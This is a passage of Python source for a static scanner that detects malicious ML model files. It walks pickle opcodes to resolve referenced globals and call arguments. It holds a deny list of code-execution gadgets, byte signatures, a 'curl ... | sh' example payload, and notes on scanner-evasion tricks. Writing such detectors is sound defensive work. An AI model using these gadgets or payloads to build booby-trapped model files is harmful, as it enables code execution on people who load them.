"""Security analysis of machine-learning model files.

Detects code execution, deserialisation attacks and malformed containers
without importing, deserialising or executing anything it reads.

Covers:
  - Pickle (.pkl, .pt, .pth): unsafe opcode and __reduce__ detection
  - SafeTensors: header validation and layout arithmetic
  - GGUF: metadata inspection and container arithmetic
  - Keras H5: Lambda layer and custom object detection
  - ONNX: custom-op RCE (PyOp/PythonOp) and external_data handling
  - TensorFlow SavedModel: GraphDef ops that read, write or execute
  - numpy .npy/.npz: allow_pickle object-array payloads
  - joblib: a plain or zlib-compressed pickle stream
  - Keras keras_metadata.pb -- the layer graph a SavedModel export writes
    outside saved_model.pb, where Lambda-layer payloads actually live
  - TorchServe .mar and NVIDIA NeMo .nemo -- zip/tar containers whose
    inner checkpoint is an ordinary pickle
  - skops .skops -- schema type references against the pickle classifier,
    plus the two loader invariants behind CVE-2025-54412/54413
"""

from __future__ import annotations

import ast
import bz2
import contextlib
import dataclasses
import io
import json
import logging
import lzma
import pickletools
import re
import reprlib
import shutil
import struct
import subprocess
import tarfile
import tempfile
import zipfile
import zlib
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any

from defusedxml.common import EntitiesForbidden

from hayward.findings import Category, Finding, Severity

logger = logging.getLogger(__name__)

# Fully-qualified `module.name` globals that grant code/command execution or
# native-code loading if referenced by a pickle's GLOBAL/STACK_GLOBAL opcode
# (regardless of whether __reduce__ actually invokes them via REDUCE/NEWOBJ --
# a reference alone is enough evidence of tampering intent for a model file).
PICKLE_DENIED_GLOBALS: frozenset[str] = frozenset({
    "os.system", "posix.system", "nt.system",
    "os.popen", "os.popen2", "os.popen3", "os.popen4",
    "os.execl", "os.execle", "os.execlp", "os.execlpe",
    "os.execv", "os.execve", "os.execvp", "os.execvpe",
    "os.spawnl", "os.spawnle", "os.spawnlp", "os.spawnlpe",
    "os.spawnv", "os.spawnve", "os.spawnvp", "os.spawnvpe",
    "os.fork", "os.forkpty", "os.kill", "os.remove", "os.unlink", "os.rmdir",
    "posix.execv", "posix.execve", "posix.fork", "posix.kill",
    "posix.spawnv", "posix.spawnve",
    "nt.spawnv", "nt.spawnve",
    "subprocess.run", "subprocess.call", "subprocess.check_call",
    "subprocess.check_output", "subprocess.Popen",
    "builtins.eval", "builtins.exec", "builtins.compile",
    "builtins.__import__",
    "__builtin__.eval", "__builtin__.exec", "__builtin__.compile",
    "__builtin__.__import__",
    "runpy._run_code", "runpy.run_path", "runpy.run_module",
    "pty.spawn",
    "shutil.rmtree",
    "ctypes.CDLL", "ctypes.PyDLL", "ctypes.WinDLL",
    # ── Published gadgets carried by picklescan's _unsafe_globals ──
    #
    # Harvested from picklescan (MIT), whose list is in turn harvested from a
    # decade of published research (Slaviero BlackHat 2011, ColdwaterQ DEFCON
    # 2022, Trail of Bits' fickling, Rehberger's backdooring series). These
    # are *known, documented* gadgets, and every one of them previously landed
    # in the unknown bucket and was suppressed at INFO whenever it was
    # referenced without an attack-shaped literal argument.
    #
    # That gap is worth stating plainly because it cuts against the argument
    # for the argument-evidence tier below: evidence-based triage answers the
    # gadget nobody has published yet, and it does nothing for the gadget
    # everyone has published and we simply never listed. The two are
    # complementary. A cloudpickle payload is the clearest case -- its
    # argument is marshalled bytecode, not a command string, so no argument
    # heuristic will ever fire on it and only the name identifies it.
    #
    # Deliberately NOT adopted from picklescan: `functools.partial`,
    # `builtins.getattr` and the `operator.attrgetter/itemgetter/methodcaller`
    # family. All three are genuinely common in legitimate pickles, and the
    # re-triage below already reports the dynamic-resolution chains they
    # enable at MEDIUM with the reason attached -- more precise than a flat
    # CRITICAL. picklescan's whole-module wildcards were also left alone: its
    # `uuid: *` entry reports an ordinary pickled `uuid.UUID` as a dangerous
    # import, which is the precision cost of that mechanism.
    "builtins.apply", "builtins.breakpoint", "builtins.open",
    "__builtin__.apply", "__builtin__.breakpoint", "__builtin__.open",
    "types.CodeType",
    "_io.FileIO",
    "logging.FileHandler",
    "pkgutil.resolve_name",
    "ensurepip._run_pip",
    "doctest.debug_script",
    "imaplib.IMAP4_stream",
    "code.InteractiveInterpreter.runcode",
    "trace.Trace.run", "trace.Trace.runctx",
    # cloudpickle reconstructs live functions from marshalled code objects --
    # arbitrary code execution by construction, and no model's weights need it.
    #
    # `_builtin_type` is the exception and is deliberately absent: it maps a
    # name to a type object ("CodeType" -> types.CodeType) and executes
    # nothing on its own. It appeared in 56 files of SafePickle's benign half,
    # 140 of whose 144 flagged files relied on cloudpickle or torch internals
    # with no sink anywhere in the stream. The companions below are what turn
    # a code object into a callable, and they stay.
    "cloudpickle.cloudpickle._function_setstate",
    "cloudpickle.cloudpickle._make_cell",
    "cloudpickle.cloudpickle._make_empty_cell",
    "cloudpickle.cloudpickle._make_function",
    "cloudpickle.cloudpickle.subimport",
    # torch's own internals reachable from a checkpoint.
    #
    # `torch.storage._load_from_bytes` is deliberately absent. It is
    # `torch.load(io.BytesIO(b), weights_only=False)`: a nested unrestricted
    # load whose whole payload lives in the bytes literal `b`. It was denied
    # outright because that inner stream was invisible to this walker, which
    # made the deny the only way to see it at all.
    #
    # That justification expired when MFV-PICKLE-008 started walking bytes
    # literals. The inner stream is now read directly, so the call is judged
    # by what it actually carries rather than by its name. The old comment
    # also claimed torch.save() never emits it, so real checkpoints were
    # unaffected: SafePickle's benign half contains 115 files that do, because
    # plain-pickling a tensor emits it too. Denying it unconditionally cost
    # 115 false positives to catch payloads the nested walk now sees.
    "torch.serialization.load",
    "torch.utils.collect_env.run",
    "torch._inductor.codecache.compile_file",
    "torch.jit.unsupported_tensor_ops.execWrapper",
    "torch._dynamo.guards.GuardBuilder.get",
    "torch.fx.experimental.symbolic_shapes.ShapeEnv.evaluate_guards_expression",
    "torch.utils._config_module.ConfigModule.load_config",
    "torch.utils.bottleneck.__main__.run_autograd_prof",
    "torch.utils.bottleneck.__main__.run_cprofile",
    "torch.utils.data.datapipes.utils.decoder.basichandlers",
    "lib2to3.pgen2.grammar.Grammar.loads",
    "lib2to3.pgen2.pgen.ParserGenerator.make_label",
    "idlelib.autocomplete.AutoComplete.fetch_completions",
    "idlelib.autocomplete.AutoComplete.get_entity",
    "idlelib.calltip.Calltip.fetch_tip",
    "idlelib.calltip.get_entity",
    "idlelib.debugobj.ObjectTreeItem.SetText",
    "idlelib.pyshell.ModifiedInterpreter.runcode",
    "idlelib.pyshell.ModifiedInterpreter.runcommand",
    "idlelib.run.Executive.runcode",
})

# Fully-qualified globals routinely emitted by legitimate serialization of
# built-in containers and common ML tensor/array formats. Referencing these
# alone is not evidence of tampering.
PICKLE_ALLOWED_GLOBALS: frozenset[str] = frozenset({
    "collections.OrderedDict", "collections.defaultdict",
    "collections.Counter", "collections.deque",
    "builtins.set", "builtins.frozenset", "builtins.dict", "builtins.list",
    "builtins.tuple", "builtins.bytearray", "builtins.complex",
    # slice() builds a data object and cannot execute anything. It appears in
    # ordinary sklearn and pandas pickles, and only became visible here once
    # the walk learned to resync past raw array bytes.
    "builtins.slice",
    "__builtin__.set", "__builtin__.frozenset",
    "copyreg._reconstructor", "copyreg.__newobj__", "copyreg.__newobj_ex__",
    "_codecs.encode",
    "numpy.core.multiarray._reconstruct", "numpy.core.multiarray.scalar",
    "numpy._core.multiarray._reconstruct", "numpy._core.multiarray.scalar",
    "numpy.ndarray", "numpy.dtype",
    "torch._utils._rebuild_tensor", "torch._utils._rebuild_tensor_v2",
    "torch._utils._rebuild_parameter", "torch._utils._rebuild_sparse_tensor",
    "torch._utils._rebuild_meta_tensor_no_storage",
    "torch.Size",
    "torch.serialization._get_layout",
})

# Modules whose dtype-specific storage/tensor classes are treated as allowed
# by name shape rather than exact match (they number in the dozens --
# FloatStorage, BFloat16Storage, HalfTensor, ... -- and change across torch
# versions, so an exhaustive list would be a maintenance trap).
#
# The parent module is matched *exactly*, not by prefix. The prefix form this
# replaces (`ref.startswith("torch.") and ref.endswith("Storage")`) was a
# wildcard over an attacker-controlled string: it allowlisted any name at any
# depth of the torch namespace, so `torch.utils.collect_env.SomeTensor` or
# `torch.<anything>.<anything>Storage` was waved through without ever being
# classified. No weaponizable callable matching it was found in torch, but the
# rule trusted far more of the namespace than the real class names occupy --
# and the whole point of the unknown bucket is that we can't enumerate what
# lives out there.
_PICKLE_ALLOWED_STORAGE_PARENTS: frozenset[str] = frozenset({
    "torch", "torch.cuda", "torch.storage",
})
# Leading `_` covers the private aliases torch has shipped (`_TypedStorage`);
# the CapWords body is what keeps a lowercase function name from matching.
_PICKLE_STORAGE_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*(?:Storage|Tensor)$")

# ML frameworks whose namespaces carry no code-execution primitives, paired
# with a class-shaped leaf (leading capital). The package prefix does the
# safety work (no exec machinery lives in sklearn.*, scipy.*, transformers.*)
# and the capital letter does the shape work: estimators, layers, dtypes and
# config dataclasses are constructed at load, while the genuinely dangerous
# members of these packages are all lowercase *functions* (dynamic-module
# loading in transformers, file I/O in sklearn.datasets), which stay in the
# unknown bucket where the argument-evidence triage sees them.
# `torch` is deliberately NOT here: torch.utils.collect_env and friends are
# dangerous submodules, and a CapWords leaf under one
# (torch.utils.collect_env.SomethingTensor) must stay unknown. torch is
# covered by the storage-parents rule and exact entries instead.
# Evidence: every unknown global across the quickset benign corpus is
# numpy/sklearn/scipy/joblib/torch/transformers machinery of exactly this
# shape (measured 2026-08-04: 62 names, all class-shaped bar the exact
# additions below).
_PICKLE_ALLOWED_ML_CLASS_ROOTS: frozenset[str] = frozenset({
    "sklearn", "scipy", "transformers",
})
_PICKLE_ML_CLASS_NAME_RE = re.compile(r"^_?[A-Z][A-Za-z0-9]*$")

# Measured ordinary-ML machinery with lowercase leaves, so the class-shape
# rule cannot cover it. Each is a type/constructor with no execution
# surface, observed in the benign corpus.
_PICKLE_ALLOWED_ML_EXACT: frozenset[str] = frozenset({
    "numpy.float64", "numpy.random.mtrand.RandomState",
    "torch.device", "argparse.Namespace",
    "joblib.numpy_pickle.NumpyArrayWrapper", "scipy.sparse._csr.csr_matrix",
})


def _is_ml_constructor_allowed(ref: str) -> bool:
    """True for refs allowlisted as ordinary ML constructors (class-shaped
    leaves in the ML roots, or the exact lowercase-leaf additions). Used by
    the classifier, and by the MFV-PICKLE-006 loop to skip them: config
    objects take string arguments constantly (step names, output_dir, device
    names), so the anomalous-string premise is false for the whole class."""
    if ref in _PICKLE_ALLOWED_ML_EXACT:
        return True
    module, _, name = ref.rpartition(".")
    root = module.partition(".")[0]
    return root in _PICKLE_ALLOWED_ML_CLASS_ROOTS and bool(
        _PICKLE_ML_CLASS_NAME_RE.match(name))

# NOTE on a tier that was tried and deliberately left out: "the root module is
# stdlib (per sys.stdlib_module_names) or bundled packaging tooling, therefore
# suspicious". The reasoning was appealing -- gadget hunters source from
# modules guaranteed present in the victim process, which is where `pip.main`,
# `linecache`, `ssl` and `operator.attrgetter` all come from, and it needs no
# hand-written list of bad names. Measured against ordinary pickles it does not
# survive: `datetime.datetime`, `decimal.Decimal`, `uuid.UUID`,
# `fractions.Fraction`, `re._compile`, `array._array_reconstructor` and
# `functools.partial` are all unrecognized stdlib globals that legitimate
# pickles construct constantly, so the tier fired on nearly every real file
# while catching nothing the argument-level signals below did not already
# catch. The stdlib is where the gadgets live *and* where the ordinary data
# types live, and nothing observable in the opcode stream separates the two.

# Bytes that commonly appear in malicious pickle payloads. Used ONLY as a
# fallback when the opcode stream can't be parsed at all (corrupted/malformed
# pickle) -- unlike opcode-based classification, a raw substring can't tell a
# real dangerous call from an unrelated string, so it's kept out of the
# primary (parseable) path entirely, which is where it used to cause false
# positives on any *well-formed* pickle whose object happened to define
# `__reduce__`/`__setstate__` (true of most custom classes). In the
# unparseable-stream fallback specifically, that risk doesn't apply the same
# way -- a stream we can't even walk as valid opcodes is already anomalous.
PICKLE_DANGER_SIGNATURES: list[bytes] = [
    b"os.system", b"subprocess", b"exec(", b"eval(",
    b"__import__", b"posix\nsystem", b"nt\nsystem",
    b"__reduce__", b"__setstate__", b"__getstate__",
]

# Opcodes that push a string constant onto the pickle VM stack -- the subset
# of the pickle protocol _resolve_pickle_globals needs to track in order to
# resolve STACK_GLOBAL's two preceding string pushes into `module.name`.
_STRING_PUSH_OPCODES = frozenset({
    "SHORT_BINUNICODE", "BINUNICODE", "BINUNICODE8", "UNICODE",
    "SHORT_BINSTRING", "BINSTRING", "STRING",
})
# Opcodes that push a literal int/float/bytes constant -- needed (alongside
# the string pushes above) to resolve REDUCE/NEWOBJ/NEWOBJ_EX call arguments
# to concrete values instead of just the callable's name.
_INT_PUSH_OPCODES = frozenset({"BININT", "BININT1", "BININT2", "LONG1", "LONG4", "INT", "LONG"})
_FLOAT_PUSH_OPCODES = frozenset({"FLOAT", "BINFLOAT"})
_BYTES_PUSH_OPCODES = frozenset({"SHORT_BINBYTES", "BINBYTES", "BINBYTES8", "BYTEARRAY8"})
_MEMO_STORE_OPCODES = frozenset({"PUT", "BINPUT", "LONG_BINPUT"})
_MEMO_FETCH_OPCODES = frozenset({"GET", "BINGET", "LONG_BINGET"})
# Opcodes that push exactly one value whose identity this walk cannot resolve.
# They must still push *something* -- see the handler in _walk_one_pickle for
# why omitting the push is an exploitable stack desync rather than a cosmetic
# gap.
_OPAQUE_PUSH_OPCODES = frozenset({
    "PERSID", "EXT1", "EXT2", "EXT4", "NEXT_BUFFER",
})

# ── Out-of-band memo indices ──────────────────────────────────────────
#
# Every Python pickler assigns memo indices densely and consecutively:
# CPython's `Pickler.memoize` does `idx = len(self.memo)`, and
# dill/cloudpickle/joblib inherit that because they subclass it. So the
# indices one pickle writes always form a *single contiguous run* with no
# holes in it.
#
# A large hole means the writer chose indices unrelated to the memo it was
# actually filling. That is what pickle-splicing tools do so a spliced-in
# memo write cannot clobber the host model's: ShadowPickle
# (arXiv:2607.17503) rewrites every `BINPUT i` in its payload to
# `LONG_BINPUT i + <constant>` for exactly this reason. The check below is on
# the *hole*, never on a particular constant, so a splicer choosing a
# different offset trips it identically.
#
# The measurement that matters is the ratio of the run's span
# (`max - min + 1`) to the number of slots actually written, not the absolute
# index. Absolute index is the wrong thing to threshold, because a `Pickler`
# reused across many `dump()` calls carries its memo forward: shared across
# 2000 five-slot dumps, a later sub-stream writes indices 4092-4102 while
# owning only 11 slots. That is a legitimate stream with a large absolute
# index and no hole, and an absolute-index rule reports it. Its span-to-slots
# ratio is 1.0, the same as every other well-formed stream.
#
# Measured across 12 real pickle-bearing model files (7 in
# benchmark/ground_truth/clean_models plus 8 in picklebench's model-cache,
# covering torch zip, torch legacy, raw and zlib joblib, and sklearn with
# custom classes) and 60 synthetic `pickle.dumps` streams (protocols 0-5
# across recursive structures, shared references, custom
# `__reduce__`/`__getstate__` classes, 20k-key dicts, bytes and set-heavy
# containers): the ratio was exactly 1.0 in every single case, with no
# exceptions. The largest legitimate span seen was 907 slots
# (tiny-random-t5's state_dict), and the largest legitimate absolute index
# 906.
#
# FACTOR is how many times its own slot count a stream's span has to reach
# before the hole counts as evidence: 64x headroom over an observed ratio
# that never left 1.0. FLOOR keeps the ratio from firing on tiny streams,
# where a handful of slots makes it noisy; at 4096 it is 4.5x the largest
# absolute index any real model here produced, and it only binds below 64
# slots (above that, slots * FACTOR is larger).
_MEMO_INDEX_BAND_FACTOR = 64
_MEMO_INDEX_BAND_FLOOR = 4096

# Cap on distinct memo indices tracked per pickle. Indices are recorded even
# when the simulated stack is empty (an index written by a spliced block is
# evidence about the writer regardless), and that is the one path that used to
# cost nothing at all -- 500MB of bare `LONG_BINPUT` opcodes is 100M distinct
# indices and several GB of set. Past this bound the pickle stops being
# profiled: a stream with a million memo slots is not the shape this check
# looks for anyway, since its own slot count would put the threshold above any
# hole in it. Set 1000x above the largest real model measured here (907 slots).
_MEMO_INDEX_MAX_TRACKED = 1_000_000


@dataclass(frozen=True)
class PickleMemoProfile:
    """How one pickle stream used the unpickler's memo.

    `slots` counts distinct memo indices written to, `max_index` is the
    highest (-1 when nothing was memoized), and `out_of_band` holds the
    indices sitting past a disproportionate hole in the run. `out_of_band` is
    empty for every well-formed stream.
    """
    slots: int
    max_index: int
    out_of_band: tuple[int, ...]


def _profile_memo_indices(indices: set[int]) -> PickleMemoProfile:
    """Summarize the memo indices one pickle stored into, flagging a hole in
    the run that is disproportionate to the memo actually in use.

    The threshold is derived from the observed slot count rather than fixed,
    so it scales with the host model: an 814-slot BERT state_dict and a
    5-slot toy pickle are both judged against a bounded multiple of their own
    memo size. Takes the distinct indices as a set so a stream that writes the
    same slot a million times costs no more to profile than the memo dict
    already being simulated alongside it.
    """
    if not indices:
        return PickleMemoProfile(0, -1, ())
    ordered = sorted(indices)
    span = ordered[-1] - ordered[0] + 1
    if span < max(_MEMO_INDEX_BAND_FLOOR, len(ordered) * _MEMO_INDEX_BAND_FACTOR):
        return PickleMemoProfile(len(ordered), ordered[-1], ())
    # There is a hole big enough to be evidence. Split the run at its widest
    # gap and report everything above it: that is the spliced block's band,
    # with the host model's own band left below.
    widest = max(range(len(ordered) - 1), key=lambda i: ordered[i + 1] - ordered[i])
    return PickleMemoProfile(len(ordered), ordered[-1], tuple(ordered[widest + 1:]))


class _PickleMarkType:
    """Sentinel for the pickle VM's MARK opcode on the simulated stack.

    The real ``Unpickler`` keeps a separate "metastack" so MARK effectively
    starts a fresh sub-stack; here a single flat list is used instead with
    this sentinel marking where the mark was pushed, popped by
    ``_pop_to_mark`` -- behaviorally equivalent, simpler to reason about
    alongside the rest of this walk.
    """
    __slots__ = ()

    def __repr__(self) -> str:
        return "<PICKLE-MARK>"


class _PickleOpaqueType:
    """Sentinel for a simulated stack value this walker can't resolve: the
    result of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call (a real unpickle would
    push whatever object that callable returned, which is unknowable
    statically), a PERSID/EXT-registry lookup, or anything else outside the
    literal-constant/container opcodes this walk understands. Keeping a
    placeholder (rather than skipping the push) is what keeps the stack
    depth simulation correct for later opcodes; being non-literal is what
    correctly poisons any enclosing args tuple that embeds it, per the
    "don't guess at values" requirement -- e.g. `Foo(SomeReduceResult())` is
    reported as callable-only, not as a fabricated literal.
    """
    __slots__ = ()

    def __repr__(self) -> str:
        return "<PICKLE-OPAQUE>"


class _PickleCallResultType:
    """Sentinel for the return value of a REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ
    call whose callable this walk *did* resolve to a `module.name`.

    A narrower `_PICKLE_OPAQUE`: the value is equally unknowable, but its
    *provenance* is not. Distinguishing "this argument is the object another
    resolved call just built" from "this argument is a persistent-ID or
    extension-registry lookup" is what makes call chaining observable, and the
    two must stay distinguishable because real model pickles are full of the
    latter -- every torch tensor is rebuilt from a PERSID storage -- and
    contain none of the former.

    Deliberately not a literal (`_is_pickle_literal` rejects it, as it rejects
    `_PICKLE_OPAQUE`), so it still poisons an enclosing argument tuple rather
    than being reported as a resolved value.
    """
    __slots__ = ("ref",)

    def __init__(self, ref: str) -> None:
        self.ref = ref

    def __repr__(self) -> str:
        return f"<PICKLE-RESULT-OF {self.ref}>"


_PICKLE_MARK = _PickleMarkType()
_PICKLE_OPAQUE = _PickleOpaqueType()


class _PickleGlobalRef(str):
    """A resolved GLOBAL/STACK_GLOBAL reference pushed on the simulated
    stack. It *renders* as a string ('numpy.ndarray'), which is exactly the
    problem: arg-text extraction was reading these as free-text arguments,
    and any allowlisted callable handed a class reference (defaultdict(int),
    _reconstruct(numpy.ndarray, ...), both constant in real models) then
    tripped the "invoked with a string argument" check. A global reference
    is an object, not text; this marker keeps the two apart without changing
    how the ref resolves, prints, or compares."""
    __slots__ = ()


def _pop_to_mark(stack: list) -> list:
    """Pop and return every value pushed since the most recent MARK, in
    original push order, consuming the MARK itself.

    Tolerates a missing MARK (truncated/malformed stream) by draining the
    whole stack rather than raising -- this walks attacker-controlled bytes,
    so a deliberately corrupted opcode sequence must degrade to "resolved
    nothing further," never crash the scan.
    """
    items: list = []
    while stack:
        value = stack.pop()
        if value is _PICKLE_MARK:
            break
        items.append(value)
    items.reverse()
    return items


def _is_pickle_literal(value: Any, _seen: set[int] | None = None) -> bool:
    """True if value is built entirely from pickle-VM literal constants
    (str, bytes, int, float, bool, None, or a tuple/list composed entirely of
    literals) -- the set of values this module is willing to print verbatim
    as resolved call-argument evidence. Returns False for `_PICKLE_OPAQUE`
    and any other unresolved/opaque stack value, which is what keeps a
    dynamic or chained-call argument (e.g. built from another REDUCE's
    return value) from being misreported as a concrete literal.

    Shared containers are visited once. The simulated stack is a DAG, not a
    tree: the `DUP` opcode pushes a second reference to the same object, so
    `DUP TUPLE2` doubles the node count a naive traversal would walk while
    costing two bytes and adding one level of depth. Repeating it is the
    pickle spelling of a billion-laughs attack -- ColdwaterQ ships exactly
    this as `billionLaughs.pt` -- and it took this function from
    milliseconds to 6.9 seconds on a **73-byte** file, doubling per extra
    round. For a scanner that is an evasion rather than a slowdown: the scan
    stalls or gets killed, and the file is never reported.

    An identity set is the right bound rather than a node budget, because the
    only way to present a genuinely large *tree* is to spend proportionally
    many bytes on it, which `MAX_SCAN_BYTES` already caps. Note this is
    memoized on identity, not equality -- two equal-but-distinct tuples are
    still each checked.
    """
    if value is None or isinstance(value, (bool, int, float, str, bytes, bytearray)):
        return True
    if isinstance(value, (tuple, list)):
        if _seen is None:
            _seen = set()
        marker = id(value)
        if marker in _seen:
            # Already validated (or currently being validated, i.e. a cycle):
            # a container that only contains containers cannot make the whole
            # value non-literal on its own.
            return True
        _seen.add(marker)
        return all(_is_pickle_literal(v, _seen) for v in value)
    return False


# Bounded renderer for resolved call arguments. Plain `repr()` walks a shared
# structure once per path, so the `DUP`-built DAG described in
# `_is_pickle_literal` renders as a 218MB string from a 73-byte file (4.7s,
# doubling per extra round) -- which then gets embedded in a finding message,
# serialized into JSON/SARIF and printed. Memoizing the *analysis* walks was
# not enough on its own; the display path needed its own bound.
#
# Only presentation is capped. Detection still reads the real values, so a
# truncated render never changes a verdict.
_PICKLE_ARG_REPR = reprlib.Repr()
_PICKLE_ARG_REPR.maxlevel = 6
_PICKLE_ARG_REPR.maxtuple = 8
_PICKLE_ARG_REPR.maxlist = 8
_PICKLE_ARG_REPR.maxset = 8
_PICKLE_ARG_REPR.maxfrozenset = 8
_PICKLE_ARG_REPR.maxdict = 8
_PICKLE_ARG_REPR.maxstring = 256
_PICKLE_ARG_REPR.maxother = 256
_PICKLE_ARG_REPR.maxlong = 64

# Cap on literal texts kept from a partially-resolved call. A handful is
# plenty of evidence; the bound exists because argument lists are
# attacker-sized.
_PICKLE_MAX_PARTIAL_TEXTS = 8


@dataclass(frozen=True)
class PickleResolvedCall:
    """A REDUCE/NEWOBJ/NEWOBJ_EX/INST/OBJ call site whose callable resolved
    to a known `module.name` global AND whose argument(s) resolved entirely
    to literal constants already on the simulated stack -- e.g. the concrete
    `('curl ... | sh',)` actually passed to `os.system`, not merely the fact
    that `os.system` is referenced somewhere in the stream. This is the
    fickling-style argument-level evidence layered on top of the existing
    global-reference walk.
    """
    ref: str
    args: tuple[Any, ...]
    kwargs: dict[str, Any] | None = None
    # Literal text arguments recovered from a call whose argument list did
    # *not* fully resolve, because at least one sibling argument was opaque.
    #
    # Requiring every argument to be literal before recording anything is the
    # right rule for `args` -- it is what keeps a fabricated value out of a
    # finding -- but applied to the whole call site it threw away real
    # evidence. The canonical dynamic-resolution chain is
    # `getattr(globals(), "eval")`: `globals()` is a REDUCE result and so
    # opaque, which discarded the `"eval"` literal that is the entire point of
    # the chain. Slaviero documented that shape in 2011 and it landed at INFO
    # here (tracked as DEF-45).
    #
    # These are strings that genuinely appeared in an argument position, never
    # a guess at an unresolved value, and `format()` renders them with
    # ellipses so a partially-resolved call can never be misread as a complete
    # one. Non-empty only when the call did not fully resolve, so it doubles
    # as the "is this partial" flag.
    partial_texts: tuple[str, ...] = ()
    # Refs of the resolved calls whose *return values* were passed into this
    # one, i.e. the edges of the call graph the pickle builds. Empty for the
    # overwhelmingly common shape where every argument is a literal, a
    # persistent-ID storage or an extension-registry lookup.
    chained_from: tuple[str, ...] = ()
    # True if this call's own return value was later used as the *callable*
    # operand of another call opcode -- the pickle invoked something it had
    # just computed. See `_triage_unknown_pickle_call` for why that is the
    # load-bearing half of the chain signal.
    result_invoked: bool = False

    def format(self) -> str:
        """Render as a call-expression string, e.g. os.system('echo pwned').

        Uses the bounded renderer above rather than plain `repr()`: these are
        attacker-controlled structures, and an unbounded render is a memory
        bomb (see `_PICKLE_ARG_REPR`).
        """
        if self.partial_texts:
            shown = ", ".join(_PICKLE_ARG_REPR.repr(t) for t in self.partial_texts)
            return f"{self.ref}(... {shown} ...)"
        parts = [_PICKLE_ARG_REPR.repr(a) for a in self.args]
        if self.kwargs:
            parts.extend(f"{k}={_PICKLE_ARG_REPR.repr(v)}" for k, v in self.kwargs.items())
        return f"{self.ref}({', '.join(parts)})"


# A protocol-2-or-later pickle opens with PROTO and its version byte. That
# two-byte marker is what a resync looks for: it is specific enough not to
# match often in tensor data, and every payload worth finding after a raw
# array uses one.
_PICKLE_RESYNC_MARKERS: tuple[bytes, ...] = tuple(
    b"\x80" + bytes([proto]) for proto in range(2, 6)
)

# Bounded so a file of near-misses cannot turn the walk quadratic. Real
# joblib files interleave a handful of arrays, not hundreds.
_MAX_PICKLE_RESYNCS = 16


def _next_pickle_offset(data: bytes, at: int) -> int | None:
    """Where the next pickle plausibly starts, at or after `at`."""
    best: int | None = None
    for marker in _PICKLE_RESYNC_MARKERS:
        found = data.find(marker, at)
        if found != -1 and (best is None or found < best):
            best = found
    return best


def _resolve_pickle_globals(
    data: bytes,
) -> tuple[list[str], list[PickleResolvedCall], PickleMemoProfile]:
    """Resolve globals and calls across *every* pickle in `data`, not just the
    first one.

    A pickle stream ends at its STOP opcode, but several real model-file
    formats concatenate multiple pickles in one file. torch's legacy (non-zip)
    save format is the important one: it writes a magic number, a protocol
    version, a sys_info dict and only *then* the actual state_dict, as four
    separate pickles, followed by raw storage bytes. Walking only as far as
    the first STOP therefore examined a 14-byte magic-number pickle and
    declared the file clean -- `os.system('...')` sitting in pickle #4 of a
    2.5MB checkpoint produced zero findings, defeating the deny list, the
    unknown-bucket re-triage and every other check in this module at once.

    So: walk pickle after pickle until the stream is exhausted or stops
    parsing. Trailing non-pickle data (the legacy format's raw tensor
    storage) makes `genops` raise, which ends the walk normally and keeps
    everything resolved so far. A failure on the *first* pickle still
    propagates, preserving the "unparseable stream" fallback in `_scan_pickle`
    that callers depend on.

    Each pickle gets a fresh stack/memo, matching how a real ``Unpickler``
    treats consecutive `load()` calls; `globals_found` and `resolved_calls`
    accumulate across all of them.

    The returned `PickleMemoProfile` is deliberately **not** accumulated. Memo
    indices are judged one pickle at a time, because a real ``Unpickler``
    starts every `load()` with an empty memo, so "one unbroken run" is a
    property of a single pickle and says nothing about a concatenation of
    them. Unioning the index sets would also raise the denominator every check
    is measured against: a torch legacy file's 14-byte magic-number pickle
    would be judged against the ~800 slots of the state_dict three pickles
    later, so a splice into the small pickle would get roughly 800x the
    headroom it should. Per-pickle judging is both what the VM does and the
    more sensitive of the two.

    What is returned is the first per-pickle profile that had out-of-band
    indices, or (when none did) the profile of whichever pickle used the most
    memo slots, so the caller sees the file's real memo shape either way.
    """
    globals_found: list[str] = []
    resolved_calls: list[PickleResolvedCall] = []
    profiles: list[PickleMemoProfile] = []

    stream = io.BytesIO(data)
    total = len(data)
    is_first = True
    resyncs = 0
    while stream.tell() < total:
        start = stream.tell()
        calls_before = len(resolved_calls)
        memo_indices: set[int] = set()
        stopped = False
        try:
            _walk_one_pickle(stream, globals_found, resolved_calls, memo_indices)
        except Exception:
            if is_first and not globals_found and not resolved_calls:
                # Nothing resolved at all -- preserve the documented contract
                # that a wholly unparseable stream raises to the caller, so
                # `_scan_pickle` still falls back to its raw-byte signature
                # scan.
                raise
            # Something was resolved before the stream stopped parsing. Keep
            # it: partial opcode evidence beats the substring fallback, which
            # is the whole reason this walk exists.
            #
            # Two real formats land here. torch's legacy layout follows its
            # pickles with raw tensor storage, which simply ends the walk.
            # joblib is the harder one: it interleaves raw array bytes *into*
            # the stream, so the very first pickle dies partway through -- at
            # byte 911 of 183761 in a stock `sklearn-iris` model, after having
            # already resolved five globals. Re-raising there threw those five
            # away and left real sklearn models analyzed by substring match
            # alone.
            stopped = True
        # Profiled even when this pickle stopped parsing partway: joblib
        # streams always do, and the indices read before the stop are as real
        # as any others.
        profiles.append(_profile_memo_indices(memo_indices))
        # Chain marking likewise stops at the pickle boundary: stack and memo
        # reset at STOP, so a chain cannot span two pickles.
        _propagate_result_invoked(resolved_calls, calls_before)
        if stopped:
            # The walk died inside raw data spliced into the stream. joblib
            # does this by design, and a payload placed *after* the arrays was
            # therefore never read: ModelAudit finds one that this walk missed
            # (quickset case joblib-payload-after-raw-array). Skip forward to
            # the next PROTO marker and keep going rather than giving up on
            # the rest of the file.
            if resyncs >= _MAX_PICKLE_RESYNCS:
                break
            resume = _next_pickle_offset(data, max(stream.tell(), start + 1))
            if resume is None:
                break
            resyncs += 1
            stream.seek(resume)
            is_first = False
            continue
        if stream.tell() <= start:
            # Defensive: a zero-length advance would spin forever on a
            # malformed stream, and this walks attacker-controlled bytes.
            break
        is_first = False

    flagged = [p for p in profiles if p.out_of_band]
    if flagged:
        memo_profile = flagged[0]
    elif profiles:
        memo_profile = max(profiles, key=lambda p: p.slots)
    else:
        memo_profile = _profile_memo_indices(set())

    return globals_found, resolved_calls, memo_profile


def _propagate_result_invoked(calls: list[PickleResolvedCall], start: int = 0) -> None:
    """Backward fixpoint for result_invoked through intermediary calls.

    The inline marking covers the direct shape (a computed value invoked
    where it was produced). PickleCloak's exp_5/exp_28/exp_88 insert an
    intermediary: `next(attr_chain(...))` is itself a call whose result is
